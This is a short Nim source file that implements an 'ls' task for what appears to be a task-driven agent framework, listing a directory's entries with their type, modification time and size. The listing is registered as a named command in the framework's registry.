import std/[os, json, strutils, times]
import ../types
import ./registry

proc lsExecute(taskId: string, params: JsonNode, state: AgentState,
               send: SendMsg): TaskResult =
  var path = params{"path"}.getStr(".")
  if path.len == 0: path = "."
  let fullPath = if isAbsolute(path): path else: state.cwd / path

  try:
    var lines: seq[string] = @[]
    lines.add("Directory: " & fullPath)
    lines.add("")
    for kind, entry in walkDir(fullPath):
      let info = getFileInfo(entry)
      let name = lastPathPart(entry)
      let mtime = format(info.lastWriteTime, "yyyy-MM-dd HH:mm")
      let (typeChar, size) = case kind
        of pcFile:        ("-", $info.size)
        of pcDir:         ("d", "<DIR>")
        of pcLinkToFile:  ("l", $info.size)
        of pcLinkToDir:   ("l", "<DIR>")
      lines.add(typeChar & "  " & mtime & "  " & align(size, 12) & "  " & name)

    if lines.len <= 2:
      lines.add("(empty directory)")
    return TaskResult(output: lines.join("\n"), status: "success", completed: true)
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initLs*() =
  register("ls", lsExecute)
